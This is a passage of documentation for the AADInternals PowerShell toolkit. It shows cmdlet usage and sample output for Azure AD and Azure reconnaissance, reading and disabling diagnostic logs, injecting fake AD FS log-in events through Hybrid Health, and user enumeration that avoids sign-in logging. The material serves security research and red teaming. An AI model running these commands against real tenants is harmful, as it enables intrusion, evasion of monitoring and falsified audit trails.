    178      10     2776       8368       0.02   4052   0 WmiPrvSE
	
[stderr]
```

### Get-AADIntAzureVMRdpSettings (AC)
Since version 0.3.3 <br>
Shows the RDP settings of the given VM

**Example:**
{{< highlight powershell >}}
# Get the Access Token
$at=Get-AADIntAccessTokenForAzureCoreManagement

# Dump the RDP settings
Get-AADIntAzureVMRdpSettings -AccessToken $at -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 -ResourceGroup PRODUCTION -Server Server2
{{< /highlight>}}

**Output:**
```
Not domain joined
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\PortNumber: 3389
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\fDenyTSConnections: 
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\KeepAliveEnable: 1
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\KeepAliveInterval: 1
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\KeepAliveTimeout: 1
HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services\fDisableAutoReconnect: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fInheritReconnectSame: 1
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fReconnectSame: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fInheritMaxSessionTime: 1
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fInheritMaxDisconnectionTime: 1
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\MaxDisconnectionTime: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\MaxConnectionTime: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\fInheritMaxIdleTime: 1
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\MaxIdleTime: 0
HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp\MaxInstanceCount: 4294967295
```

### Get-AADIntAzureTenants (AC)
Since version 0.4.0 <br>
Lists all Azure AD tenants the user has access to.

**Example:**
{{< highlight powershell >}}
# Get the Access Token and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# List the tenants
Get-AADIntAzureTenants
{{< /highlight>}}

**Output:**
```
Id                                   Country Name        Domains                                                                                                  
--                                   ------- ----        -------                                                                                                  
221769d7-0747-467c-a5c1-e387a232c58c FI      Firma Oy    {firma.mail.onmicrosoft.com, firma.onmicrosoft.com, firma.fi}              
6e3846ee-e8ca-4609-a3ab-f405cfbd02cd US      Company Ltd {company.onmicrosoft.com, company.mail.onmicrosoft.com,company.com}
```

### Get-AADIntAzureInformation (AC)
Since version 0.4.0 <br>
Gets some Azure Tenant information, including certain tenant settings and ALL domains. The access token MUST be stored to cache! Works also for **guest users**!

The Tenant is not required for Access Token but is recommended as some tenants may have MFA.

**Example:**
{{< highlight powershell >}}
# Get the Access Token and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -Tenant 6e3846ee-e8ca-4609-a3ab-f405cfbd02cd -SaveToCache

# Show the information
Get-AADIntAzureInformation -Tenant 6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
{{< /highlight>}}

**Output:**
```
objectId                                  : 6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
displayName                               : Company Ltd
usersCanRegisterApps                      : True
isAnyAccessPanelPreviewFeaturesAvailable  : False
showMyGroupsFeature                       : False
myGroupsFeatureValue                      : 
myGroupsGroupId                           : 
myGroupsGroupName                         : 
showMyAppsFeature                         : False
myAppsFeatureValue                        : 
myAppsGroupId                             : 
myAppsGroupName                           : 
showUserActivityReportsFeature            : False
userActivityReportsFeatureValue           : 
userActivityReportsGroupId                : 
userActivityReportsGroupName              : 
showRegisteredAuthMethodFeature           : False
registeredAuthMethodFeatureValue          : 
registeredAuthMethodGroupId               : 
registeredAuthMethodGroupName             : 
usersCanAddExternalUsers                  : False
limitedAccessCanAddExternalUsers          : False
restrictDirectoryAccess                   : False
groupsInAccessPanelEnabled                : False
selfServiceGroupManagementEnabled         : True
securityGroupsEnabled                     : False
usersCanManageSecurityGroups              : 
office365GroupsEnabled                    : False
usersCanManageOfficeGroups                : 
allUsersGroupEnabled                      : False
scopingGroupIdForManagingSecurityGroups   : 
scopingGroupIdForManagingOfficeGroups     : 
scopingGroupNameForManagingSecurityGroups : 
scopingGroupNameForManagingOfficeGroups   : 
objectIdForAllUserGroup                   : 
allowInvitations                          : False
isB2CTenant                               : False
restrictNonAdminUsers                     : False
enableLinkedInAppFamily                   : 0
toEnableLinkedInUsers                     : {}
toDisableLinkedInUsers                    : {}
linkedInSelectedGroupObjectId             : 
linkedInSelectedGroupDisplayName          : 
allowedActions                            : @{application=System.Object[]; domain=System.Object[]; group=System.Object[]; serviceprincipal=System.Object[]; 
											tenantdetail=System.Object[]; user=System.Object[]; serviceaction=System.Object[]}
skuInfo                                   : @{aadPremiumBasic=False; aadPremium=False; aadPremiumP2=False; aadBasic=False; aadBasicEdu=False; aadSmb=False; 
											enterprisePackE3=False; enterprisePremiumE5=False}
domains                                   : {@{authenticationType=Managed; availabilityStatus=; isAdminManaged=True; isDefault=False; isDefaultForCloudRedirections=False; 
											isInitial=False; isRoot=True; isVerified=True; name=company.com; supportedServices=System.Object[]; forceDeleteState=; state=; 
											passwordValidityPeriodInDays=; passwordNotificationWindowInDays=}, @{authenticationType=Managed; availabilityStatus=; 
											isAdminManaged=True; isDefault=False; isDefaultForCloudRedirections=False; isInitial=True; isRoot=True; isVerified=True; 
											name=company.onmicrosoft.com;}...}
```

### Get-AADIntAzureSignInLog (M)
Since version 0.4.0 <br>
Returns the 50 latest entries from Azure AD sign-in log or single entry by id.

**Example:**
{{< highlight powershell >}}
# Get the Access Token and save to cache
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Show the log
Get-AADIntAzureSignInLog
{{< /highlight>}}

**Output:**
```
createdDateTime              id                                   ipAddress      userPrincipalName             appDisplayName                   
---------------              --                                   ---------      -----------------             --------------                   
2020-05-25T05:54:28.5131075Z b223590e-8ba1-4d54-be54-03071659f900 199.11.103.31  admin@company.onmicrosoft.com Azure Portal                     
2020-05-29T07:56:50.2565658Z f6151a97-98cc-444e-a79f-a80b54490b00 139.93.35.110  user@company.com              Azure Portal                     
2020-05-29T08:02:24.8788565Z ad2cfeff-52f2-442a-b8fc-1e951b480b00 11.146.246.254 user2@company.com             Microsoft Docs                   
2020-05-29T08:56:48.7857468Z e0f8e629-863f-43f5-a956-a4046a100d00 1.239.249.24   admin@company.onmicrosoft.com Azure Active Directory PowerShell
```

{{< highlight powershell >}}
# Show the information for a single entry 
Get-AADIntAzureSignInLog -EntryId b223590e-8ba1-4d54-be54-03071659f900
{{< /highlight>}}

**Output:**
```
id                                : b223590e-8ba1-4d54-be54-03071659f900
createdDateTime                   : 2020-05-25T05:54:28.5131075Z
userDisplayName                   : admin company
userPrincipalName                 : admin@company.onmicrosoft.com
userId                            : 289fcdf8-af4e-40eb-a363-0430bc98d4d1
appId                             : c44b4083-3bb0-49c1-b47d-974e53cbdf3c
appDisplayName                    : Azure Portal
ipAddress                         : 199.11.103.31
clientAppUsed                     : Browser
userAgent                         : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
...
```

### Get-AADIntAzureAuditLog (M)
Since version 0.4.0 <br>
Returns the 50 latest entries from Azure AD sign-in log or single entry by id.

**Example:**
{{< highlight powershell >}}
# Get the Access Token and save to cache
Get-AADIntAccessTokenForMSGraph -SaveToCache

# Show the log
Get-AADIntAzureAuditLog
{{< /highlight>}}

**Output:**
```
id                                                            activityDateTime             activityDisplayName   operationType result  initiatedBy   
--                                                            ----------------             -------------------   ------------- ------  -----------   
Directory_9af6aff3-dc09-4ac1-a1d3-143e80977b3e_EZPWC_41985545 2020-05-29T07:57:51.4037921Z Add service principal Add           success @{user=; app=}
Directory_f830a9d4-e746-48dc-944c-eb093364c011_1ZJAE_22273050 2020-05-29T07:57:51.6245497Z Add service principal Add           failure @{user=; app=}
Directory_a813bc02-5d7a-4a40-9d37-7d4081d42b42_RKRRS_12877155 2020-06-02T12:49:38.5177891Z Add user              Add           success @{app=; user=}
```

{{< highlight powershell >}}
# Show the information for a single entry 
Get-AADIntAzureAuditLog -EntryId Directory_9af6aff3-dc09-4ac1-a1d3-143e80977b3e_EZPWC_41985545
{{< /highlight>}}

**Output:**
```
id                  : Directory_9af6aff3-dc09-4ac1-a1d3-143e80977b3e_EZPWC_41985545
category            : ApplicationManagement
correlationId       : 9af6aff3-dc09-4ac1-a1d3-143e80977b3e
result              : success
resultReason        : 
activityDisplayName : Add service principal
activityDateTime    : 2020-05-29T07:57:51.4037921Z
loggedByService     : Core Directory
operationType       : Add
initiatedBy         : @{user=; app=}
targetResources     : {@{id=66ce0b00-92ee-4851-8495-7c144b77601f; displayName=Azure Credential Configuration Endpoint Service; type=ServicePrincipal; userPrincipalName=; 
					  groupType=; modifiedProperties=System.Object[]}}
additionalDetails   : {}
```


### Remove-AADIntAzureDiagnosticSettings (AC)
Since version 0.4.5 <br>
Removes all diagnostic settings by disabling all logs.

**Example:**
{{< highlight powershell >}}
# Get the access token
$at=Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Remove the diagnostic settings
Remove-AADIntAzureDiagnosticSettings
{{< /highlight>}}

### Get-AADIntAzureDiagnosticSettings (AC)
Since version 0.4.5 <br>
Lists all diagnostic settings.

**Example:**
{{< highlight powershell >}}
# Get the access token
$at=Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# List diagnostic settings
Get-AADIntAzureDiagnosticSettings
{{< /highlight>}}

**Output:**
```
Name                        : Audit and SignIn to Sentinel
WorkspaceId                 : /subscriptions/a04293e7-46c8-4bf4-bc6d-1bc1f41afae0/resourcegroups/sentinel/providers/microsoft.operationalinsights/workspaces/MySentinel
StorageAccountId            : 
EventHubAuthorizationRuleId : 
EventHubName                : 
ServiceBusRuleId            : 

Name                        : Service Principal to Sentinel
WorkspaceId                 : /subscriptions/a04293e7-46c8-4bf4-bc6d-1bc1f41afae0/resourcegroups/sentinel/providers/microsoft.operationalinsights/workspaces/MySentinel
StorageAccountId            : 
EventHubAuthorizationRuleId : 
EventHubName                : 
ServiceBusRuleId            :
```

### Get-AADIntAzureDiagnosticSettingsDetails (AC)
Since version 0.4.5 <br>
Gets log settings of the given Azure workspace.

**Example:** (continuing from the previous)
{{< highlight powershell >}}
# List diagnostic settings for the given workspace
Get-AADAzureIntDiagnosticSettingsDetails -Name "Audit and SignIn to Sentinel"
{{< /highlight>}}

**Output:**
```
Log                          Enabled Retention Enabled Retention Days
---                          ------- ----------------- --------------
ProvisioningLogs               False             False              0
AuditLogs                      False             False              0
SignInLogs                     False             False              0
NonInteractiveUserSignInLogs   False             False              0
ServicePrincipalSignInLogs     False             False              0
ManagedIdentitySignInLogs       True              True            365
```

### Set-AADIntAzureDiagnosticSettingsDetails (AC)
Since version 0.4.5 <br>
Sets log settings for the given Azure workspace.

**Example:** (continuing from the previous)
{{< highlight powershell >}}
# Set the diagnostic log settings for the given workspace
Set-AADIntDiagnosticSettingsDetails -Name "Audit and SignIn to Sentinel" -Log ManagedIdentitySignInLogs,AuditLogs,SignInLogs -Enabled $true -RetentionEnabled $true -RetentionDays 365
{{< /highlight>}}

**Output:**
```
Log                          Enabled Retention Enabled Retention Days
---                          ------- ----------------- --------------
ProvisioningLogs               False             False              0
AuditLogs                       True              True            365
SignInLogs                      True              True            365
NonInteractiveUserSignInLogs   False             False              0
ServicePrincipalSignInLogs     False             False              0
ManagedIdentitySignInLogs       True              True            365
```

### Get-AADIntAzureDirectoryActivityLog (AC)
Since version 0.6.1 <br>
Gets Azure Directory Activity log events even from tenants without Azure subscription.

**Note:** If the tenant doesn't have Azure subscription, the user must have "Access management for Azure resources" switched on at
https://portal.azure.com/#blade/Microsoft_AAD_IAM/ActiveDirectoryMenuBlade/Properties or use <a href="#grant-aadintazureuseraccessadminrole-ac">Grant-AADIntAzureUserAccessAdminRole</a>.

**Example:**
{{< highlight powershell >}}
# Get the access token and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Optional: grant Azure User Access Administrator role 
Grant-AADIntAzureUserAccessAdminRole

# Get the events for the last month
$events = Get-AADIntAzureDirectoryActivityLog -Start (Get-Date).AddDays(-31)

# Select ADHybridHealthService related events and extract relevant information
$events | where {$_.authorization.action -like "Microsoft.ADHybrid*"} | %{New-Object psobject -Property ([ordered]@{"Scope"=$_.authorization.scope;"Operation"=$_.operationName.localizedValue;"Caller"=$_.caller;"TimeStamp"=$_.eventTimeStamp;"IpAddress"=$_.httpRequest.clientIpAddress})} | ft
{{< /highlight>}}

**Output:**
```
Scope                                                                                    Operation          Caller                               TimeStamp IpAddress                  
-----                                                                                    ---------          ------                               --------- ---------         
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:59.0148112Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:58.3348792Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:16.2093169Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:10:15.5693784Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:07:11.3219081Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:07:10.5819036Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:04:18.1500781Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts2.company.com Creates a server.  admin@company.com 2021-08-25T15:04:17.7750301Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:02:33.2797177Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:02:33.0297112Z 51.65.246.212
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:26.9612649Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:26.7262514Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:18.4399245Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService/services/AdFederationService-sts.company.com  Deletes service.   admin@company.com 2021-08-25T15:01:18.2599207Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T15:00:00.5760736Z 152.219.25.6
/providers/Microsoft.ADHybridHealthService                                               Updates a service. admin@company.com 2021-08-25T14:59:53.6402357Z 152.219.25.6
```

### Get-AADIntAzureWireServerAddress
Since version 0.6.5 <br>
Gets Azure and Azure Stack WireServer ip address using DHCP. If DHCP query fails, returns the default address (168.63.129.16)

**Example:**
{{< highlight powershell >}}
# Get WireServer address
Get-AADIntAzureWireServerAddress
{{< /highlight>}}

**Output:**
```
168.63.129.16
```

## Hybrid Health functions

The following functions can be used to add new Hybrid Health services and agents, and to create & send fake log-in events to Azure AD.

### New-AADIntHybridHealthService (AC)
Since version 0.5.0 <br>

Creates a new ADHybridHealthService

**Example:**

{{< highlight powershell>}}
# Get an access token and save it to the cache:
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create a new AD FS service
New-AADIntHybridHealthService -DisplayName "sts.company.com" -Signature "sts.company.com" -Type AdFederationService
{{< /highlight>}}

**Output:**
```
activeAlerts                             : 0
additionalInformation                    : 
createdDate                              : 2021-07-12T07:25:29.1009287Z
customNotificationEmails                 : 
disabled                                 : False
displayName                              : sts.company.com
health                                   : Healthy
lastDisabled                             : 
lastUpdated                              : 0001-01-01T00:00:00
monitoringConfigurationsComputed         : 
monitoringConfigurationsCustomized       : 
notificationEmailEnabled                 : True
notificationEmailEnabledForGlobalAdmins  : True
notificationEmails                       : 
notificationEmailsEnabledForGlobalAdmins : False
resolvedAlerts                           : 0
serviceId                                : 189c61bb-2c9c-4e86-b038-d0257c6c559e
serviceMembers                           : 
serviceName                              : AdFederationService-sts.company.com
signature                                : sts.company.com
simpleProperties                         : 
tenantId                                 : c5ff949d-2696-4b68-9e13-055f19ed2d51
type                                     : AdFederationService
originalDisabledState                    : False
```

### Get-AADIntHybridHealthServices (AC)
Since version 0.5.0 <br>

Gets ADHybridHealthServices

**Example:**

{{< highlight powershell>}}
# Get an access token and save it to the cache:
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# List the service names
Get-AADIntHybridHealthServices -Service AdFederationService | ft serviceName
{{< /highlight>}}

**Output:**
```
serviceName                             
-----------                             
AdFederationService-sts.company.com     
AdFederationService-sts.fake.myo365.site
```

### Remove-AADIntHybridHealthService (AC)
Since version 0.5.0 <br>

Removes an ADHybridHealthService

**Example:**

{{< highlight powershell>}}
# Get an access token and save it to the cache:
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Remove the service
Remove-AADIntHybridHealthService -ServiceName "AdFederationService-sts.company.com"
{{< /highlight>}}

### New-AADIntHybridHealthServiceMember (AC)
Since version 0.5.0 <br>

Adds a new ADHybridHealthService member

**Example:**

{{< highlight powershell>}}
# Get an access token and save it to the cache:
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create a new service member
New-AADIntHybridHealthServiceMember -ServiceName "AdFederationService-sts.company.com" -MachineName "MyServer"
{{< /highlight>}}

**Output:**
```
lastReboot                              : 0001-01-01T00:00:00Z
lastDisabled                            : 
lastUpdated                             : 0001-01-01T00:00:00
activeAlerts                            : 0
resolvedAlerts                          : 0
createdDate                             : 2021-05-06T07:15:50.0087136Z
disabled                                : False
dimensions                              : 
additionalInformation                   : 
tenantId                                : 5b53828e-8e7b-42d1-a5f0-9b34bbd1844a
serviceId                               : 50abc8f3-243a-4ac1-a3fb-712054d7334b
serviceMemberId                         : 0fce7ce0-81a0-4bf7-87fb-fc787dfe13c2
machineId                               : e9f8357d-8a25-4cef-8c6b-f0b3c916ead5
machineName                             : MyServer
role                                    : 
status                                  : Healthy
properties                              : 
installedQfes                           : 
recommendedQfes                         : 
monitoringConfigurationsComputed        : 
monitoringConfigurationsCustomized      : 
osVersion                               : 
osName                                  : 
disabledReason                          : 0
serverReportedMonitoringLevel           : 
lastServerReportedMonitoringLevelChange :
```

### Get-AADIntHybridHealthServiceMembers (AC)
Since version 0.5.0 <br>

Gets ADHybridHealthService members

**Example:**

{{< highlight powershell>}}
# Get an access token and save it to the cache:
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# List the service members
Get-AADIntHybridHealthServiceMembers -ServiceName "AdFederationService-sts.company.com" | ft machineName,serviceMemberId
{{< /highlight>}}

**Output:**
```
machineName serviceMemberId                     
----------- ---------------                     
SERVER      bec07a23-dd4a-4c80-8c92-9b9dc089f75c
PROXY       e4d72022-a268-4167-a964-1899b8baeaa5
```

### Remove-AADIntHybridHealthServiceMember (AC)
Since version 0.5.0 <br>

Removes a ADHybridHealthService member

**Example:**

{{< highlight powershell>}}
# Get an access token and save it to the cache:
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Remove service member
Remove-AADIntHybridHealthServiceMember -ServiceName "AdFederationService-sts.company.com" -ServiceMemberId 329485ce-9b5b-4652-ba72-acc41a455e92
{{< /highlight>}}

### Get-AADIntHybridHealthServiceMonitoringPolicies (AC)
Since version 0.5.0 <br>

Gets ADHybridHealthService monitoring policies.

**Example:**

{{< highlight powershell>}}
# Get an access token and save it to the cache:
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# List the monitoring policies
Get-AADIntHybridHealthServiceMonitoringPolicies
{{< /highlight>}}

**Output:**
```
serviceType                       : AdFederationService
serviceId                         : 74b6a260-67a3-43ac-922f-ec7afe19649c
serviceMemberId                   : 52f7c09f-e6a4-41ff-b328-bb6a182e1aca
monitoringConfigurations          : {@{key=AadPremium; value=True}, @{key=MonitoringLevel; value=Full}}
propertiesExtractorClassName      : Microsoft.Identity.Health.Adfs.DataAccess.DataManager, Microsoft.Identity.Health.Adfs.DataAccess
dimensionTableEntityClassNameList : 
roleType                          : AdfsServer_2016
moduleConfigurations              : {@{agentService=ConnectorAgent; moduleName=adfs; properties=}, @{agentService=ConnectorAgent; moduleName=PowerShellCmdletMonitor; properties=}}

serviceType                       : AadSyncService
serviceId                         : 4ce7a4dd-0269-4ae1-a92c-88f381f11a33
serviceMemberId                   : fa657e9b-b609-470c-aa6a-9922d9f37e49
monitoringConfigurations          : {@{key=MonitoringLevel; value=Off}, @{key=StagingMode; value=False}, @{key=ConfigurationUploadInterval; value=240}, @{key=RunProfileResultUploadInterval; value=30}...}
propertiesExtractorClassName      : Microsoft.Identity.Health.AadSync.DataAccess.DataManager, Microsoft.Identity.Health.AadSync.DataAccess
dimensionTableEntityClassNameList : 
roleType                          : AadSync_AadConnectSync_1.0
moduleConfigurations              : {@{agentService=ConnectorAgent; moduleName=aadsync; properties=}}
```

### Send-AADIntHybridHealthServiceEvents
Since version 0.5.0 <br>

Sends the given AD FS log-in events to Azure using ADHybridHealthService protocols.

**Example:**

{{< highlight powershell>}}
# Create an empty array
$events = @()

# Add new event(s) to the array
$events += (New-AADIntHybridHealtServiceEvent -Server "Server" -UPN "user@company.com" -IPAddress "192.168.0.2")

# Get the agent information from the local AD FS server or proxy
$agentInfo = Get-AADIntHybridHealthServiceAgentInfo

# Send the events
Send-AADIntHybridHealthServiceEvents -AgentInfo $agentInfo -Events $events 
{{< /highlight>}}

### New-AADIntHybridHealtServiceEvent (AC)
Since version 0.5.0 <br>

Creates a new ADHybridHealthService event with the given parameters.

**Example:**

{{< highlight powershell>}}
# Create an empty array
$events = @()

# Add new event(s) to the array
$events += (New-AADIntHybridHealtServiceEvent -Server "Server" -UPN "user@company.com" -IPAddress "192.168.0.2")

# Get the agent information from the local AD FS server or proxy
$agentInfo = Get-AADIntHybridHealthServiceAgentInfo

# Send the events
Send-AADIntHybridHealthServiceEvents -AgentInfo $agentInfo -Events $events 
{{< /highlight>}}


### Register-AADIntHybridHealthServiceAgent (AC)
Since version 0.5.0 <br>

Creates a new ADHybridHealthService

**Example:**

{{< highlight powershell>}}
# List the service names
Get-AADIntHybridHealthServices -Service AdFederationService | ft serviceName
{{< /highlight>}}

```
serviceName                             
-----------                             
AdFederationService-sts.company.com     
AdFederationService-sts.fake.myo365.site
```

{{< highlight powershell>}}
# Register a new AD FS server
Register-AADIntHybridHealthServiceAgent -ServiceName "AdFederationService-sts.company.com" -MachineName "ADFS01" -MachineRole AdfsServer_2016
{{< /highlight>}}

```
Agent info saved to         "AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.json"
Client sertificate saved to "AdFederationService-sts.company.com_c5ff949d-2696-4b68-9e13-055f19ed2d51_224a18a0-b450-477c-a437-07916855e570_ADFS01.pfx"
```

## Kill chain functions

These functions are part of <a href="/aadkillchain/" target="_blank">AAD & M365 Kill Chain</a>.

### Invoke-AADIntReconAsOutsider
Since version 0.4.0 <br>

Starts tenant recon of the given domain. Gets all verified domains of the tenant and extracts information such as their type.

Also checks whether Desktop SSO (aka Seamless SSO) is enabled for the tenant.

Value | Description
  --- | ---
DNS   | Does the DNS record exists?
MX    | Does the MX point to Office 365?
SPF   | Does the SPF contain Exchange Online?
Type  | Federated or Managed
DMARC | Is the DMARC record configured?
STS   | The FQDN of the federated IdP's (Identity Provider) STS (Security Token Service) server
RPS   | Relaying parties of STS (AD FS). Requires -GetRelayingParties switch.

**Example 1:**
{{< highlight powershell >}}
# Invoke tenant recon as an outsider
Invoke-AADIntReconAsOutsider -Domain "company.com" | Format-Table
{{< /highlight>}}

**Output:**
```
Tenant brand:       Company Ltd
Tenant name:        company
Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
DesktopSSO enabled: False

Name                           DNS   MX    SPF  DMARC Type      STS
----                           ---   --    ---  ----- ----      ---
company.com                   True  True  True   True Federated sts.company.com
company.mail.onmicrosoft.com  True  True  True  False Managed
company.onmicrosoft.com       True  True  True  False Managed
int.company.com              False False False  False Managed
```

**Example 2:**
{{< highlight powershell >}}
# Invoke tenant recon as an outsider using a known user name to show CBA status
Invoke-AADIntReconAsOutsider -UserName "user@company.com" | Format-Table
{{< /highlight>}}

**Output:**
```
Tenant brand:       Company Ltd
Tenant name:        company
Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
DesktopSSO enabled: False
CBA enabled:        True

Name                           DNS   MX    SPF  DMARC Type      STS
----                           ---   --    ---  ----- ----      ---
company.com                   True  True  True   True Federated sts.company.com
company.mail.onmicrosoft.com  True  True  True  False Managed
company.onmicrosoft.com       True  True  True  False Managed
int.company.com              False False False  False Managed
```

**Example 3:**
{{< highlight powershell >}}
# Invoke tenant recon and get relaying trust parties
Invoke-AADIntReconAsOutsider -Domain "company.com" -GetRelayingParties | Format-Table
{{< /highlight>}}

**Output:**
```
Tenant brand:       Company Ltd
Tenant name:        company
Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
DesktopSSO enabled: False

Name                           DNS   MX    SPF  DMARC  Type      STS             RPS
----                           ---   --    ---  -----  ----      ---             ---
company.com                   True  True  True   True  Federated sts.company.com {adatum.com, salesforce.com}
company.mail.onmicrosoft.com  True  True  True   True  Managed
company.onmicrosoft.com       True  True  True  False  Managed
int.company.com              False False False  False  Managed
```

### Invoke-AADIntUserEnumerationAsOutsider
Since version 0.4.0 <br>

Checks whether the given user exists in Azure AD or not. Works also with external users! Supports three enumeration methods: 

Method    | Description
---       | ---
Normal    | Originally, worked only if the user is in the tenant where Desktop SSO (aka Seamless SSO) is enabled for any domain. Seems to work for all tenants now.
Login     | Works with any tenant, but enumeration queries will be logged to Azure AD sign-in log as failed login events!
Autologon | Works with any tenant and enumeration queries are not logged!

Returns $True or $False if existence can be verified and empty if not.

**Example 1:**
{{< highlight powershell >}}
# Invoke user enumeration as an outsider
Invoke-AADIntUserEnumerationAsOutsider -UserName "user@company.com"
{{< /highlight>}}

**Output:**
```
UserName         Exists
--------         ------
user@company.com True
```

**Example 2:**
{{< highlight powershell >}}
# Invoke user enumeration as an outsider using a text file
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider
{{< /highlight>}}

**Output:**
```
UserName                                               Exists
--------                                               ------
user@company.com                                       True
user2@company.com                                      False
user@company.net                                      
external.user_gmail.com#EXT#@company.onmicrosoft.com   True
external.user_outlook.com#EXT#@company.onmicrosoft.com False
```

**Example 3:**
{{< highlight powershell >}}
# Invoke user enumeration as an outsider using a text file with Login method
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Login
{{< /highlight>}}

**Output:**
```
UserName                                               Exists
--------                                               ------
user@company.com                                       True
user2@company.com                                      False
user@company.net                                       True
external.user_gmail.com#EXT#@company.onmicrosoft.com   True
external.user_outlook.com#EXT#@company.onmicrosoft.com False
```

**Example 4:**
{{< highlight powershell >}}
# Invoke user enumeration as an outsider with Autologon method
Invoke-AADIntUserEnumerationAsOutsider -UserName "user@company.com","user2@company.com" -Method Autologon
{{< /highlight>}}

**Output:**
```
UserName                                               Exists
--------                                               ------
user@company.com                                       True
user2@company.com                                      False
```


### Invoke-AADIntReconAsGuest (AC)
Since version 0.4.0 <br>

Starts tenant recon of Azure AD tenant. Prompts for tenant. Retrieves information from Azure AD tenant, such as, the number of Azure AD objects and quota, and the number of domains (both verified and unverified).

**Example 1:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Invoke tenant recon as guest
$results = Invoke-AADIntReconAsGuest
{{< /highlight>}}

**Output:**
```
Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
```
{{< highlight powershell >}}
# Show users allowed actions
$results.allowedActions
{{< /highlight>}}
**Output:**
```
application      : {read}
domain           : {read}
group            : {read}
serviceprincipal : {read}
tenantdetail     : {read}
user             : {read, update}
serviceaction    : {consent}
```

**Example 2:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# List Azure tenants the user has access to
Get-AADIntAzureTenants
{{< /highlight>}}

**Output:**
```
Id                                   Country Name                      Domains
--                                   ------- ----                      -------
221769d7-0747-467c-a5c1-e387a232c58c FI      Firma Oy                  {firma.mail.onmicrosoft.com, firma.onmicrosoft.com, firma.fi}
6e3846ee-e8ca-4609-a3ab-f405cfbd02cd US      Company Ltd               {company.onmicrosoft.com, company.mail.onmicrosoft.com,company.com}
```
{{< highlight powershell >}}
# Get a new access token for the specific tenant in case of MFA is required
